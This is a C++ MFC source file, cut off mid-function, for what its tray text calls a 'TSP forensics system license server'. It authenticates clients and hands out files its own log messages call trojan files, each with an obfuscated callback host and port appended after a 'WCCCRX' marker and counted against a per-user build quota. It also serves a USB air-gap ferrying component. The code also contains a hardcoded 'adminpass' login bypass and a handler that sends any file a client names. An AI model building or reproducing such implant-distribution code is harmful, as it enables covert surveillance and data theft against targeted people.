// TSPLoginSrvDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "TSPLicense.h"
#include "TSPLicenseDlg.h"
#include <shlwapi.h>
#include "winver.h"
#include "GenUTransmission.h"

#pragma comment (lib, "Version.lib")
#include "COMMON.h"
#include "encode.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

//#include "myprocess.h"
//#pragma comment(lib,"foxsdkA.lib")


#include "WriteLog.h"

CWriteLog *m_plog;

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CTSPLoginSrvDlg 对话框



#ifdef PUBLISH
#define LICSERVER_LISPORT	443
#else
#define LICSERVER_LISPORT	444
#endif

UINT CTSPLoginSrvDlg::m_nTaskCreatedMSG = ::RegisterWindowMessage(_T("TaskbarCreated"));
UINT CTSPLoginSrvDlg::m_nTaskTrayNotify = WM_USER+100;

void PrintString(TCHAR *tszStr,...)
{
	TCHAR szFormat[MAX_PATH*2] = {0};

	va_list argList;
	va_start(argList,tszStr);
	_vsntprintf_s(szFormat, MAX_PATH*2-1,tszStr, argList );
	va_end(argList);
	OutputDebugString(szFormat);
}

CTSPLoginSrvDlg::CTSPLoginSrvDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CTSPLoginSrvDlg::IDD, pParent)
	, m_port(LICSERVER_LISPORT)
	, m_strFileName(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);

	GetCurrentDirectory( sizeof(DAT_PATH), DAT_PATH );
	lstrcpy(INI_PATH, DAT_PATH );
	lstrcat(DAT_PATH, "\\" );
	lstrcat(INI_PATH, "\\" );
	lstrcat(DAT_PATH, DAT_NAME);
	lstrcat(INI_PATH, INI_NAME);

	char szTemp[MAX_PATH] = {0};
	::GetModuleFileName(NULL, szTemp, sizeof(szTemp));
	char *pPos = StrRChr(szTemp, NULL, '\\');
	*pPos = 0;
	wsprintf(CLIENT_PATH, "%s\\%s", szTemp, CLIENT_NAME);
	//wsprintf(CLIENT_UPDATAINFO_PATH, "%s\\%s", szTemp, CLIENT_UPDATAINFO_NAME);
}

void CTSPLoginSrvDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_PORT, m_port);
	DDV_MinMaxInt(pDX, m_port, 1, 65535);
	DDX_Text(pDX, IDC_EDIT_SRVFILEPATH, m_strFileName);
}

BEGIN_MESSAGE_MAP(CTSPLoginSrvDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_BTN_SELFILE, &CTSPLoginSrvDlg::OnBnClickedBtnSelfile)
	ON_BN_CLICKED(IDC_BTN_STARTSRV, &CTSPLoginSrvDlg::OnBnClickedBtnStartsrv)
	ON_BN_CLICKED(IDC_BTN_STOPSRV, &CTSPLoginSrvDlg::OnBnClickedBtnStopsrv)
	ON_BN_CLICKED(IDC_BTN_USERMGR, &CTSPLoginSrvDlg::OnBnClickedBtnStopsrv2)
	ON_BN_CLICKED(IDC_BTN_EXIT, &CTSPLoginSrvDlg::OnBnClickedBtnExit)
	ON_COMMAND(IDM_HIDE, &CTSPLoginSrvDlg::OnHide)
	ON_COMMAND(IDM_SHOW, &CTSPLoginSrvDlg::OnShow)
	ON_COMMAND(IDM_EXIT, &CTSPLoginSrvDlg::OnExit)
	ON_WM_TIMER()
END_MESSAGE_MAP()


// CTSPLoginSrvDlg 消息处理程序

BOOL CTSPLoginSrvDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		CString strAboutMenu;
		strAboutMenu.LoadString(IDS_ABOUTBOX);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标


// 	DWORD dwID=0;
// 	TCHAR szCurrenPath[MAX_PATH]={0};
// 	GetModuleFileNameA(0,szCurrenPath,MAX_PATH);
// 	TCHAR *strPos=StrRChr(szCurrenPath,0,'\\');
// 	strPos++;
// 
// 	DWORD dwCurrentProcID=GetCurrentProcessId();
// 
// 
// 
// 	do 
// 	{
// 		dwID=CProcess::FindProcessID(strPos);
// 
// 		if (dwID&&dwID!=dwCurrentProcID)
// 		{
// 			CProcess::KillAllProcessByName(strPos);
// 			break;
// 		}
// 	} while (dwID);



	m_TrayIcon.Create(this, 
		m_nTaskTrayNotify, 
		"TSP取证系统授权服务器",
		AfxGetApp()->LoadIcon(IDR_MAINFRAME), 
		IDR_MINIMIZE,
		TRUE); //构造

	// TODO: 在此添加额外的初始化代码
	WSADATA wsaData;
	int iRet = WSAStartup(MAKEWORD(2,2),&wsaData);
	if( iRet != NO_ERROR ) AfxMessageBox("Error at WSAStartup()");

	//OutputDebugStringA("fdsf");

	OnBnClickedBtnStartsrv();


	m_plog=CWriteLog::CreateLogInstance();


	this->SetTimer(0,1000*10,0);//10复制一次

	//this->SetTimer(1,5000,0);//1小时重启一次
	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CTSPLoginSrvDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else if (nID == SC_MINIMIZE)
	{
		ShowWindow(SW_MINIMIZE);
		ShowWindow(SW_HIDE);
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CTSPLoginSrvDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CTSPLoginSrvDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void My_GetTime(char Rstr[])
{
	time_t curtime=time(0);
	tm tim = *localtime(&curtime);
	int day,mon,year,hour,minute,seconds;
	day = tim.tm_mday;
	mon = tim.tm_mon;
	year = tim.tm_year;
	hour = tim.tm_hour;
	minute = tim.tm_min;
	seconds = tim.tm_sec;

	year += 1900;
	mon += 1;
	wsprintf( Rstr, "%04d%02d%02d", year, mon, day );
}





void SendFile( SOCKET sock, char *username, char *ConnPass )//SOCKET,服务的配置信息,用户名
{
	char Buffer[128] = {0};

	HANDLE hFile = CreateFile( DAT_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		AfxMessageBox("DAT文件不存在!");
		return;
	}

	//验证使用次数
	char read_build[256];
	char new_build[256];
	memset( read_build, 0, sizeof(read_build) );
	GetPrivateProfileString( username, "build", NULL, read_build, sizeof(read_build), INI_PATH );
	if ( atoi(read_build) <= 0 )
	{
		CloseHandle(hFile);
		return;
	}

	//得到域名及其端口信息
	char read_dns[256] = {0};
	memset( read_dns, 0, sizeof(read_dns) );
	GetPrivateProfileString( username, "DNS", NULL, read_dns, sizeof(read_dns), INI_PATH );
	if ( lstrlen(read_dns) == 0 )
	{
		CloseHandle(hFile);
		return;//获取错误，直接返回
	}

	ConnPass++;
	if ( lstrlen(ConnPass) != 0 )
	{
		lstrcat( read_dns, "|" );
		lstrcat( read_dns, ConnPass );
	}

	//然后加密信息
	
	//2011/05/16 -yx  
	((UCHAR*)read_dns)[0]+=8;


	char *Config_INFO = MyEncode(read_dns);
	char finally_info[256] = "WCCCRX";//6个A，上线时查找
	lstrcat( finally_info, Config_INFO );
	delete Config_INFO;

	NET_DATA MyData = {0};
	MyData.dwSizeTotal = GetFileSize(hFile, NULL);

	while(1)
	{
		MyData.Flags = FILE_BUFFER;
		ReadFile(hFile, MyData.Buffer, 1024, &MyData.Buffer_Size, NULL);
		if ( MyData.Buffer_Size == 0 )//读取完了，文件发送完成，继续发送配置信息,并且使用次数减1
		{
			SAFE_CLOSEHANDLE(hFile);
			memset( new_build, 0, sizeof(new_build) );
			wsprintf( new_build, "%d", atoi(read_build) - 1 );
			WritePrivateProfileString( username, "build", new_build, INI_PATH );
			memset( &MyData, 0, sizeof(NET_DATA) );
			MyData.Flags = FILE_FINISH;
			lstrcpy( (char*)&MyData.Buffer, finally_info );
			MyData.Buffer_Size = lstrlen(finally_info) + 1;
			if ( send( sock, (char*)&MyData, sizeof(MyData), NULL ) == SOCKET_ERROR ) break;
			recv( sock, Buffer, sizeof(Buffer), NULL );
			break;
		}
		if (send( sock, (char*)&MyData, sizeof(MyData), NULL ) == SOCKET_ERROR ) break;
		recv( sock, Buffer, sizeof(Buffer), NULL );
	}

	SAFE_CLOSEHANDLE(hFile);

	return;
}



void SendConfig( SOCKET sock, char *username, char *ConnPass )//SOCKET,服务的配置信息,用户名
{
	char Buffer[128] = {0};

	//得到域名及其端口信息
	char read_dns[256] = {0};
	GetPrivateProfileString( username, "DNS", NULL, read_dns, sizeof(read_dns), INI_PATH );
	if ( lstrlen(read_dns) == 0 )
	{
		return;//获取错误，直接返回
	}

	// 	ConnPass++;
	// 	if ( lstrlen(ConnPass) != 0 )
	// 	{
	// 		lstrcat( read_dns, "|" );
	// 		lstrcat( read_dns, ConnPass );
	// 	}

	//然后加密信息
	//read_dns[0]+=

	//
	// IP地址的第一个字符+3
	//2011/05/16 yx  
	//read_dns[0]+=3;

	//OutputDebugStringA(read_dns);
	char *Config_INFO = MyEncode(read_dns);
	//OutputDebugStringA(Config_INFO);


	

	char finally_info[256] = {0};
	lstrcpy( finally_info, Config_INFO );
	delete Config_INFO;

	send(sock, finally_info, sizeof(finally_info), 0);

	return;
}

void SendVerClient(SOCKET sock, char *username, char *ConnPass)
{
	char finally_info[256] = {0};

	DWORD dwHandle = 0; 
	DWORD dwSize = GetFileVersionInfoSize(CLIENT_PATH, &dwHandle);
	if (0 == dwSize)
	{
		return;
	}

	HANDLE hFile = CreateFile(CLIENT_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		AfxMessageBox("Client文件不存在!");
		return;
	}

	LPBYTE lpBuffer = new  BYTE[dwSize];  
	::RtlZeroMemory(lpBuffer, dwSize);

	typedef struct tagVS_VERSIONINFO 
	{ 
		WORD wLength; 
		WORD wValueLength; 
		WORD wType; 
		WCHAR szKey[1]; 
		WORD wPadding1[1]; 
		VS_FIXEDFILEINFO Value; 
		WORD wPadding2[1]; 
		WORD wChildren[1]; 
	}VS_VERSIONINFO ,*PVS_VERSIONINFO ; 

	struct  SINGLEVERSION
	{
		WORD nLow;
		WORD nHigh;
	};

	typedef struct tagVERTRANSLATE 
	{ 
		WORD wLanguage; 
		WORD wCodePage; 
	}VERTRANSLATE, *PVERTRANSLATE; 

	BOOL bRet = FALSE;
	do 
	{
		VS_VERSIONINFO *pVerInfo = NULL; 
		if  (!GetFileVersionInfo(CLIENT_PATH, 0, dwSize, lpBuffer))  
		{
			break;
		}

		UINT uTemp = 0; 
		VERTRANSLATE *pInfoTranslate = NULL;
		if (!::VerQueryValue(lpBuffer, _T("\\VarFileInfo\\Translation"), (LPVOID *)&pInfoTranslate, &uTemp)) 
		{
			break;
		}
		//获取字符串编译时间信息
		TCHAR szSFI[MAX_PATH] = {0};
		::wsprintf( szSFI, _T( "\\StringFileInfo\\%04X%04X\\%s" ), pInfoTranslate->wLanguage, pInfoTranslate->wCodePage, "PrivateBuild");

		TCHAR *lpszBuf = NULL;
		UINT uLen = 0;
		if( !::VerQueryValue(lpBuffer, (LPTSTR)szSFI, (LPVOID*)&lpszBuf, &uLen))
		{
			break;
		}

		lstrcpy(finally_info, lpszBuf);
		bRet = TRUE;

	} while (FALSE);

	delete [] lpBuffer; 
	SAFE_CLOSEHANDLE(hFile);

	send(sock, finally_info, sizeof(finally_info), 0);
}



void SendVerServer(SOCKET sock, char *username, char *ConnPass)
{
	char finally_info[256] = {0};

	DWORD dwHandle = 0; 
	DWORD dwSize = GetFileVersionInfoSize(DAT_NAME, &dwHandle);
	if (0 == dwSize)
	{
		return;
	}

	HANDLE hFile = CreateFile(DAT_NAME, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		AfxMessageBox("server.dat文件不存在!");
		return;
	}
	SAFE_CLOSEHANDLE(hFile);

	LPBYTE lpBuffer = new  BYTE[dwSize];  
	::RtlZeroMemory(lpBuffer, dwSize);

	typedef struct tagVS_VERSIONINFO 
	{ 
		WORD wLength; 
		WORD wValueLength; 
		WORD wType; 
		WCHAR szKey[1]; 
		WORD wPadding1[1]; 
		VS_FIXEDFILEINFO Value; 
		WORD wPadding2[1]; 
		WORD wChildren[1]; 
	}VS_VERSIONINFO ,*PVS_VERSIONINFO ; 

	struct  SINGLEVERSION
	{
		WORD nLow;
		WORD nHigh;
	};

	typedef struct tagVERTRANSLATE 
	{ 
		WORD wLanguage; 
		WORD wCodePage; 
	}VERTRANSLATE, *PVERTRANSLATE; 

	BOOL bRet = FALSE;
	do 
	{
		VS_VERSIONINFO *pVerInfo = NULL; 
		if  (!GetFileVersionInfo(DAT_NAME, 0, dwSize, lpBuffer))  
		{
			break;
		}

		UINT uTemp = 0; 
		VERTRANSLATE *pInfoTranslate = NULL;
		if (!::VerQueryValue(lpBuffer, _T("\\VarFileInfo\\Translation"), (LPVOID *)&pInfoTranslate, &uTemp)) 
		{
			break;
		}
		//获取字符串编译时间信息
		TCHAR szSFI[MAX_PATH] = {0};
		::wsprintf( szSFI, _T( "\\StringFileInfo\\%04X%04X\\%s" ), pInfoTranslate->wLanguage, pInfoTranslate->wCodePage, "FILEVERSION");

		TCHAR *lpszBuf = NULL;
		UINT uLen = 0;
		if( !::VerQueryValue(lpBuffer, (LPTSTR)szSFI, (LPVOID*)&lpszBuf, &uLen))
		{
			break;
		}

		lstrcpy(finally_info, lpszBuf);
		bRet = TRUE;

	} while (FALSE);

	delete [] lpBuffer; 
	

	send(sock, finally_info, sizeof(finally_info), 0);
}


int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}
// 
// void SendFileAndSingnal(SOCKET sock,TCHAR *szFileName,BYTE *szBuf,DWORD dwBufSize)
// {
// 
// 
// 
// }


void SendFileContext(SOCKET sock,TCHAR *szFileName,BYTE *szBuf,DWORD dwBufSize)
{

	char szFullPath[MAX_PATH] = {0};
	::GetModuleFileName(NULL, szFullPath,MAX_PATH);
	char *pPos = StrRChr(szFullPath, NULL, '\\');
	if(pPos) *(pPos+1)=0;

	StrCat(szFullPath,szFileName);

	HANDLE hFile = CreateFile(szFullPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		PrintString("%s文件不存在!",szFullPath);
		return;
	}

	DWORD dwFileSize = GetFileSize(hFile, NULL);

	BYTE *pData=new BYTE[dwFileSize+dwBufSize];
	memset(pData, 0,dwFileSize);
	DWORD dwRead;

	ReadFile(hFile,pData,dwFileSize,&dwRead,NULL);
	SAFE_CLOSEHANDLE(hFile);

	if (szBuf)
	{
		memcpy(pData+dwFileSize,szBuf,dwBufSize);
		dwFileSize+=dwBufSize;
	}

	//发送文件大小
	if(send(sock,(char*)&dwFileSize,4,NULL)==SOCKET_ERROR)
	{
		PrintString("发送文件大小时出错%d",GetLastError());
		SAFE_CLOSEHANDLE(hFile);
		return;
	}




	//SendWithSplit(sock,pData,dwFileSize,RECV_MAX_BUF);

	//NET_DATA MyData = {0};

	char Buffer[128] = {0};

	DWORD dwSendSize=0;

	DWORD dwAllSendSize=0;


	while(1)
	{

		if (dwFileSize-dwAllSendSize>RECV_MAX_BUF)
		{

			dwSendSize=send(sock,(char*)pData+dwAllSendSize,RECV_MAX_BUF,0);

			if (dwSendSize==0||dwSendSize==SOCKET_ERROR) break;
			dwAllSendSize+=dwSendSize;

		}
		else
		{
			dwSendSize=send(sock,(char *)pData+dwAllSendSize,dwFileSize-dwAllSendSize,0);
			break;
		}

	}
	delete pData;



}

void SendServer(SOCKET sock, char *username, char *ConnPass,char *szServerName )//SOCKET,服务的配置信息,用户名
{
	char Buffer[128] = {0};

	//验证使用次数
	char read_build[256];
	char new_build[256];
	memset( read_build, 0, sizeof(read_build) );
	GetPrivateProfileString( username, "build", NULL, read_build, sizeof(read_build), INI_PATH );
	if ( atoi(read_build) <= 0 )
	{
		return;
	}

	//得到域名及其端口信息
	char read_dns[256] = {0};
	memset( read_dns, 0, sizeof(read_dns) );
	GetPrivateProfileString( username, "DNS", NULL, read_dns, sizeof(read_dns), INI_PATH );
	if ( lstrlen(read_dns) == 0 )
	{
		return;//获取错误，直接返回
	}

	ConnPass++;
	if ( lstrlen(ConnPass) != 0 )
	{
		lstrcat( read_dns, "|" );
		lstrcat( read_dns, ConnPass );
	}

	//然后加密信息
	//2011/05/16 -yx  
// 	((UCHAR*)read_dns)[0]+=8;
// 	((UCHAR*)read_dns)[1]+=8;
// 	((UCHAR*)read_dns)[2]+=8;
// 	((UCHAR*)read_dns)[3]+=8;
// 	((UCHAR*)read_dns)[4]+=8;


	for (size_t i = 0; i <strlen(read_dns); i++)
	{
		if (read_dns[i]!=0x67)
		{
			read_dns[i] ^= 0x67;

		}
	}

	char *Config_INFO = MyEncode(read_dns);
	//OutputDebugStringA(Config_INFO);
	char finally_info[256] = "WCCCRX";//6个A，上线时查找
	lstrcat( finally_info, Config_INFO );
	delete Config_INFO;

	//减少使用次数
	memset( new_build, 0, sizeof(new_build) );
	wsprintf( new_build, "%d", atoi(read_build) - 1 );
	WritePrivateProfileString( username, "build", new_build, INI_PATH );

	SendFileContext(sock,szServerName,(BYTE*)finally_info,strlen(finally_info));

	//SendFileContext(sock,"server.dat",(BYTE*)finally_info,strlen(finally_info));
	//send(sock,(char*)finally_info,strlen(finally_info),NULL);
}


void SendClient( SOCKET sock, char *username, char *ConnPass )
{

	HANDLE hFile = CreateFile( CLIENT_PATH, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		AfxMessageBox("Client文件不存在!");
		return;
	}

	DWORD dwFileSize = GetFileSize(hFile, NULL);

	//发送文件大小
	if(send(sock,(char*)&dwFileSize,4,NULL)==SOCKET_ERROR)
	{
		SAFE_CLOSEHANDLE(hFile);
		return;
	}

	BYTE *pData=new BYTE[dwFileSize];
	memset(pData, 0,dwFileSize);
	DWORD dwRead;

	ReadFile(hFile,pData,dwFileSize,&dwRead,NULL);

	//SendWithSplit(sock,pData,dwFileSize,RECV_MAX_BUF);

	//NET_DATA MyData = {0};

	char Buffer[128] = {0};

	DWORD dwSendSize=0;

	DWORD dwAllSendSize=0;


	while(1)
	{

		if(dwFileSize-dwAllSendSize>RECV_MAX_BUF)
		{

			dwSendSize=send(sock,(char*)pData+dwAllSendSize,RECV_MAX_BUF,0);

			if (dwSendSize==0&&dwSendSize==SOCKET_ERROR) break;
			dwAllSendSize+=dwSendSize;

		}
		else
		{
			dwSendSize=send(sock,(char *)pData+dwAllSendSize,dwFileSize-dwAllSendSize,0);
			break;
		}



	}

	SAFE_CLOSEHANDLE(hFile);
}






BOOL CheckUser(TCHAR *szClientDns,char *buff, char *username )
{
/*
Login:用户名@密码
*/
	m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s %s 登录-----",szClientDns,buff);

	char read_pass[256];
	char read_date[256];
	char bendi_date[256];
	char read_dns[256];

	char *pTmpPos = NULL;

	if ((strncmp(buff, "Login:", 6) == 0) && (NULL != (pTmpPos=strchr( buff, ':' )) ) && (NULL !=  strchr( pTmpPos, '@' )) )//如果前面几个验证字符相等
	{
		char *pos1 = strchr( buff, ':' );
		pos1++;

		char *pos2 = strchr( pos1, '@' );
		*pos2 = '\0';
		pos2++;

		//测试时用的账户
		if (lstrcmpi(pos1,"adminpass")==0)//完全相等，忽略大小写
		{
			lstrcpy(username, pos1 );
			m_plog->WriteLog(LOG_LEVEL_2,"成功\r\n");
			return TRUE;					
		}


		memset( read_pass, 0, sizeof(read_pass) );
		GetPrivateProfileString( pos1, "USERPASS", NULL, read_pass, sizeof(read_pass), INI_PATH );
		if (lstrcmpi(pos2,read_pass)==0)//完全相等，忽略大小写
		{

			//验证使用时间是否到期
			memset( read_date, 0, sizeof(read_date) );
			GetPrivateProfileString( pos1, "date", NULL, read_date, sizeof(read_date), INI_PATH );
			My_GetTime(bendi_date);
			if (atoi(bendi_date) > atoi(read_date))
			{
				m_plog->WriteLog(LOG_LEVEL_2,"该账户超过使用期限!\r\n");
				return FALSE;
			}

			//验证IP和端口是否正确
			memset(read_dns, 0, sizeof(read_dns));
			GetPrivateProfileString(pos1, "dns", NULL, read_dns, sizeof(read_dns), INI_PATH );

			TCHAR *szPos=StrRChr(read_dns,0,':');

			*szPos=0;

			hostent* pHostent = NULL;

			pHostent = gethostbyname(read_dns);

		//	char *p=inet_ntoa(*((struct in_addr *)pHostent->h_addr));
			if (!pHostent)
			{
				system("ipconfig /flushdns");
				Sleep(1000);
				pHostent = gethostbyname(read_dns);
				if (!pHostent)
				{
					m_plog->WriteLog(LOG_LEVEL_2,"无法获取域名：%s!\r\n",read_dns);
					return FALSE;

				}
			}


			if (!StrStr(inet_ntoa(*((struct in_addr *)pHostent->h_addr)),szClientDns))
			{
				m_plog->WriteLog(LOG_LEVEL_2,"配置文件中的DNS: %s和连接来的IP不匹配!\r\n",read_dns);
				return FALSE;
			}

			lstrcpy(username, pos1 );
			m_plog->WriteLog(LOG_LEVEL_2,"成功\r\n");

			return TRUE;
		}
		else
		{
			m_plog->WriteLog(LOG_LEVEL_2,"账号或者密码错误\r\n");
			return FALSE;
		}
	}
	else//连验证字符都不相等，直接PASS
	{
		m_plog->WriteLog(LOG_LEVEL_2,"登录账户格式不对\r\n");
		return FALSE;
	}
}

/*
多线程处理事件
*/
DWORD WINAPI AnswerThread(LPVOID lparam)
{
	SOCKET ClientSocket=(SOCKET)lparam;
	char Buffer[1024] = {0};
	char UserName[30] = {0};
	int Ret = 0;
	BOOL isLogined = FALSE;
	char *strYes = "Logined";
	char *strNO = "Wrong";

	TCHAR szClientDNS[MAX_PATH]={0};

	GetClientDNS(ClientSocket,szClientDNS);

	while(1)
	{
		memset( Buffer, 0, sizeof(Buffer) );
		Ret = recv( ClientSocket, Buffer, sizeof(Buffer), NULL );
		if ( Ret == 0 || Ret == SOCKET_ERROR )
		{
			break;
		}

		if (!isLogined )//没有登录
		{
			if (CheckUser(szClientDNS,Buffer,UserName))
			{
				isLogined = TRUE;
				send(ClientSocket, strYes, lstrlen(strYes) + 1, NULL );//发送字符，告诉客户端已经通过验证
				continue;
			}
			else//没有登录还不登录的，直接断开
			{
				break;
			}
		}
		else//已经登录
		{
			switch ((BYTE)Buffer[0])
			{
			case DOWN_SERVER://如果是获取木马文件
				m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s下载木马文件\r\n",szClientDNS);

				SendFile( ClientSocket, UserName, Buffer );

				break;
			case GET_CONFIG://如果是获取配置文件
				SendConfig( ClientSocket, UserName, Buffer );
				break;
			case GET_VERSION://如果是获取客户端版本信息
				SendVerClient( ClientSocket, UserName, Buffer );
				break;

			case GET_VERSIONSER://如果是获取服务端版本信息
				SendVerServer( ClientSocket, UserName, Buffer );
				break;

			case DOWN_CLIENT:
				m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s下载文件%s",szClientDNS,CLIENT_NAME);

				SendFileContext(ClientSocket,CLIENT_NAME,0,0);

				m_plog->WriteLog(LOG_LEVEL_2,"完成\r\n");

				//SendClient( ClientSocket, UserName, Buffer );
				break;
			case GET_CLIENTUPDATAINFO:
				SendFileContext(ClientSocket,CLIENT_UPDATAINFO_NAME,0,0);
	//			SendClientUpdataInfo(ClientSocket);
				break;
			case DOWN_FILE: //下载文件
				
				m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s下载文件%s",szClientDNS,(char*)(Buffer+1));

				SendFileContext(ClientSocket,(char*)(Buffer+1),0,0);
				m_plog->WriteLog(LOG_LEVEL_2,"完成\r\n");
				break;

			case DOWN_SERVER_NEW: 
				m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s下载木马文件:server.dat",szClientDNS);
				SendServer(ClientSocket,UserName,Buffer,"server.dat");
				m_plog->WriteLog(LOG_LEVEL_2,"完成\r\n");

					//			SendClientUpdataInfo(ClientSocket);
				break;

			case DOWN_WUHAN_SERVER:

				m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s下载木马文件:%s",szClientDNS,(char*)(Buffer+1));
				SendServer(ClientSocket,UserName,0,(char*)(Buffer+1));
				m_plog->WriteLog(LOG_LEVEL_2,"完成\r\n");


				break;

			case DOWN_LINYI_SERVER:

				m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s下载武汉木马文件:linyiserver.dat\r\n",szClientDNS);
				SendServer(ClientSocket,UserName,Buffer,"linyiserver.dat");
				m_plog->WriteLog(LOG_LEVEL_2,"完成\r\n");

				break;

			case DOWN_TSP20_SERVER:  //add by menglz

				m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s下载2.0木马文件:server20.dat",szClientDNS);
				SendServer(ClientSocket,UserName,Buffer,"server20.dat");
				m_plog->WriteLog(LOG_LEVEL_2,"完成\r\n");

				break;

			case DOWN_UTRANSMISSION:
				m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s下载U盘摆渡文件",szClientDNS);
				BOOL bRet = SendUTransmission(ClientSocket, &Buffer[1]);
				if (bRet)
				{
					m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s下载U盘摆渡文件成功\r\n",szClientDNS);
				}
				else
				{
					m_plog->WriteLog(LOG_LEVEL_1,"客户端 :%s下载U盘摆渡文件失败\r\n",szClientDNS);
				}
				
				break;

			}

			break;
		}
	}

	closesocket(ClientSocket);
	return 0;
}

DWORD WINAPI ListenThread(LPVOID lparam)
{
	SOCKET AcceptSocket;
	DWORD dwThreadId;

	while (1)
	{
		AcceptSocket = SOCKET_ERROR;
		while(AcceptSocket == SOCKET_ERROR)
		{
			AcceptSocket = accept( m_hSocket, 0, 0);
		}

		HANDLE hThread =CreateThread( NULL, NULL, AnswerThread, (LPVOID)AcceptSocket,0,&dwThreadId);
		CloseHandle(hThread);
	}

	return 0;
}

void CTSPLoginSrvDlg::OnBnClickedBtnSelfile()
{
	// TODO: 在此添加控件通知处理程序代码
}

void CTSPLoginSrvDlg::OnBnClickedBtnStartsrv()
{
	// TODO: 在此添加控件通知处理程序代码
	UpdateData(TRUE);
	if ( m_port <= 0 || m_port >65535 )
	{
		return;
	}

	
	SOCKADDR_IN m_addr;
	int iRet = 0;
	DWORD ThreadId;

	if ( m_hSocket != NULL )
	{
		closesocket(m_hSocket);
	}

	memset( &m_addr, 0, sizeof(SOCKADDR) );
	m_addr.sin_family = AF_INET;
	m_addr.sin_addr.S_un.S_addr = INADDR_ANY;
	m_addr.sin_port = htons(m_port);

	m_hSocket = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(bind(m_hSocket,(LPSOCKADDR)&m_addr,sizeof(m_addr)) == SOCKET_ERROR)
	{
		AfxMessageBox("Bind失败,端口可能被占用!");
		//return;
	}

	if ( listen( m_hSocket,10000 ) ==  SOCKET_ERROR )
	{
		AfxMessageBox("Listen失败!");
		return;
	}

	hLinstenThread = CreateThread( NULL, NULL, ListenThread, NULL, 0, &ThreadId);
	((CEdit*)GetDlgItem(IDC_EDIT_PORT))->EnableWindow(FALSE);
	((CButton*)GetDlgItem(IDC_BTN_STARTSRV))->EnableWindow(FALSE);	//禁用按钮
	((CButton*)GetDlgItem(IDC_BTN_STOPSRV))->EnableWindow(TRUE);
}

void CTSPLoginSrvDlg::OnBnClickedBtnStopsrv()
{
